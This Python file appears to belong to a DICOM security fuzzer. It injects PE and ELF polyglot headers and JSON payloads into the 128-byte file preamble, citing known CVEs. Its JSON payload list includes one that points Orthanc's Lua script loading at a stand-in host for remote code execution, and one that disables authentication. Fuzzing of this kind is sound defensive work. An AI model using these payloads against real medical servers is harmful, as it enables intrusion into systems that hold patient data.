"""Preamble Polyglot Fuzzer - DICOM Preamble Injection Attacks.

Category: generic

Attacks (all binary-level via mutate_bytes):
- pe_polyglot: MZ+PE header stub (CVE-2019-11687)
- elf_polyglot: ELF magic + e_ident header (Praetorian ELFDICOM 2025)
- json_preamble: JSON payload (Orthanc CVE-2023-33466)
- ff_preamble: All 0xFF bytes
- random_preamble: Random bytes stress test
"""

from __future__ import annotations

import random
import struct

from pydicom.dataset import Dataset

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

_PREAMBLE_LEN = 128
_DICM_OFFSET = 128
_DATA_OFFSET = 132
_DICM_MAGIC = b"DICM"


class PreambleFuzzer(FormatFuzzerBase):
    """Inject polyglot headers into the 128-byte DICOM preamble.

    The DICOM standard (PS3.10 7.1) reserves the first 128 bytes as a
    preamble for application-specific use, followed by the "DICM" magic.
    Systems that dispatch on file magic or parse the preamble as structured
    data can be confused by valid-DICOM files that simultaneously appear to
    be PE executables, ELF binaries, or JSON configuration objects.

    All mutations happen in mutate_bytes() because pydicom resets the
    preamble on dcmwrite() -- the preamble must be patched post-serialization.

    CVEs targeted:
    - CVE-2019-11687: DICOM PE polyglot (original research)
    - Praetorian ELFDICOM 2025: Linux ELF variant
    - Orthanc CVE-2023-33466: JSON in preamble -> config overwrite -> Lua RCE
    """

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "preamble"

    def mutate(self, dataset: Dataset) -> Dataset:
        """No dataset-level mutation; all work happens in mutate_bytes."""
        self.last_variant = None
        return dataset

    def mutate_bytes(self, file_data: bytes) -> bytes:
        """Replace preamble bytes 0-127 with a polyglot header.

        Preserves the DICM magic at offset 128-131 and all data elements.
        Falls back to returning file_data unchanged on any error.
        """
        self._applied_binary_mutations = []
        if len(file_data) < _DATA_OFFSET:
            return file_data
        if file_data[_DICM_OFFSET:_DATA_OFFSET] != _DICM_MAGIC:
            return file_data

        attacks = [
            self._pe_polyglot,
            self._elf_polyglot,
            self._json_preamble,
            self._ff_preamble,
            self._random_preamble,
        ]
        attack = random.choice(attacks)
        try:
            new_preamble = attack()
            assert len(new_preamble) == _PREAMBLE_LEN
            result = new_preamble + file_data[_DICM_OFFSET:]
            self._applied_binary_mutations.append(attack.__name__)
            self.last_variant = attack.__name__
            return result
        except Exception as e:
            logger.debug("Preamble attack %s failed: %s", attack.__name__, e)
            return file_data

    def _pe_polyglot(self) -> bytes:
        r"""MZ DOS header + PE signature stub in bytes 0-127.

        Targets AV scanners and DICOM routers that dispatch on file magic.
        CVE-2019-11687: a DICOM file starting with MZ is simultaneously
        valid DICOM and a Windows PE executable to many tools.

        Layout:
          0x00-0x3F  MZ DOS stub (64 bytes), e_lfanew -> 64
          0x40-0x43  PE signature (PE\0\0)
          0x44-0x57  COFF header (IMAGE_FILE_MACHINE_AMD64)
          0x58-0x7F  zero padding
        """
        mz = bytearray(64)
        mz[0:2] = b"MZ"
        struct.pack_into("<I", mz, 0x3C, 64)  # e_lfanew -> offset 64

        pe_sig = b"PE\x00\x00"
        coff = struct.pack(
            "<HHIIIHH",
            0x8664,  # Machine: IMAGE_FILE_MACHINE_AMD64
            0,  # NumberOfSections
            0,  # TimeDateStamp
            0,  # PointerToSymbolTable
            0,  # NumberOfSymbols
            0,  # SizeOfOptionalHeader
            0x0002,  # Characteristics: executable image
        )
        data = bytes(mz) + pe_sig + coff
        return data[:_PREAMBLE_LEN].ljust(_PREAMBLE_LEN, b"\x00")

    def _elf_polyglot(self) -> bytes:
        """ELF magic + Elf64_Ehdr fields in bytes 0-127.

        Targets Linux-based DICOM servers and AV scanners.
        Praetorian ELFDICOM 2025: a DICOM file that Linux 'file' identifies
        as a 64-bit ELF binary due to the preamble magic.

        Layout (64-byte Elf64_Ehdr):
          0x00-0x0F  e_ident (ELF magic, class, endian, version, OS/ABI)
          0x10-0x3F  remaining Elf64_Ehdr fields
          0x40-0x7F  zero padding
        """
        e_ident = bytearray(16)
        e_ident[0:4] = b"\x7fELF"
        e_ident[4] = 2  # ELFCLASS64
        e_ident[5] = 1  # ELFDATA2LSB (little-endian)
        e_ident[6] = 1  # EV_CURRENT

        # Elf64_Ehdr body (48 bytes): H H I Q Q Q I H H H H H H
        elf_body = struct.pack(
            "<HHIQQQIHHHHHH",
            2,  # e_type: ET_EXEC
            0x3E,  # e_machine: AMD64
            1,  # e_version
            0,  # e_entry
            64,  # e_phoff (program header after ehdr)
            0,  # e_shoff
            0,  # e_flags
            64,  # e_ehsize
            56,  # e_phentsize
            0,  # e_phnum
            64,  # e_shentsize
            0,  # e_shnum
            0,  # e_shstrndx
        )
        data = bytes(e_ident) + elf_body  # 64 bytes total
        return data[:_PREAMBLE_LEN].ljust(_PREAMBLE_LEN, b"\x00")

    def _json_preamble(self) -> bytes:
        """JSON payload in bytes 0-127, null-padded to 128 bytes.

        Targets Orthanc-style systems that parse the preamble as JSON config.
        Orthanc CVE-2023-33466: JSON in preamble triggers a config overwrite
        that leads to a Lua script execution chain.
        """
        payloads = [
            b'{"LuaScripts":["http://x.invalid/rce.lua"],"HttpProxy":"x"}',
            b'{"RemoteAccessAllowed":true,"AuthenticationEnabled":false}',
            b'{"StorageDirectory":"/tmp","Database":"/tmp/orthanc.db"}',
            b'{"PeerConnectivityTimeout":0,"StorageCommitmentDelay":0}',
        ]
        raw = random.choice(payloads)
        return raw[:_PREAMBLE_LEN].ljust(_PREAMBLE_LEN, b"\x00")

    def _ff_preamble(self) -> bytes:
        """All 0xFF bytes in the preamble.

        Forces parsers that pattern-match the preamble into their 'binary
        file' code path and may trigger integer overflow when preamble bytes
        feed into length or offset computations.
        """
        return b"\xff" * _PREAMBLE_LEN

    def _random_preamble(self) -> bytes:
        """Random bytes stress test.

        Exercises any preamble-reading code path with unpredictable content,
        catching length and encoding assumptions not triggered by structured
        payloads.
        """
        return bytes(random.getrandbits(8) for _ in range(_PREAMBLE_LEN))
